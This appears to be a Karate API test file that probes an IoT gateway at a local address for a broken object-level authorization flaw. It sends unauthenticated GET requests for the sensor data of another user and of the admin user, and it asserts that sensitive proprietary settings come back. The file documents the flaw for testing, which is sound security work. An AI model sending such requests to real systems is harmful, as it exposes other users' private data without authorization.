Feature: Test BOLA (Broken Object Level Authorization) vulnerability in IoT Gateway

Background:
   * url 'http://192.168.1.109:48080'

Scenario: Verify access to other users' sensor data without proper authorization
    # First access a legitimate user's sensors
    Given path '/users/user1/sensors'
    When method get
    Then status 200
    And match response != null
    And match response['TEMP001'] != null
    
    # Then access another user's sensors (premium_user) without authentication
    Given path '/users/premium_user/sensors'
    When method get
    Then status 200  # This SHOULD fail with 403 but doesn't due to the BOLA vulnerability
    And match response != null
    And match response['TEMP004'] != null
    And match response['TEMP004'].sensitive_data != null
    And match response['TEMP004'].sensitive_data.proprietary_settings != null
    
    # Verify we can access admin user's sensors too (this demonstrates the vulnerability)
    Given path '/users/admin/sensors'
    When method get
    Then status 200  # Again, should require authorization but doesn't
    And match response != null